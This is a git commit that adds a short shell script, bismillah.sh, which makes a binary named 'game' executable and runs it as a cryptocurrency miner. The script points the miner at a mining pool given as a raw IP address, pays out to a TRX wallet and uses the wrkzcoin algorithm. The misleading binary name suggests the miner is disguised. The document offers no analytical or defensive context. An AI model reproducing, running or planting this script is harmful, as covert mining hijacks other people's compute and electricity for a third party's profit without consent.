2ec0af3ea832ce7d126b88996a088f50b289a293
Diefky <Diefky@users.noreply.github.com>
2021-08-12 17:24:50 +0700

    Create bismillah.sh

---
+++ bismillah.sh
@@ -0,0 +1,9 @@
+POOL=172.104.191.254:3333
+
+WALLET=TRX:TASC9862ZH2zedMNWwqnW5LkuyTCkirVAM
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-ST-)
+
+chmod +x game
+
+./game --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin 
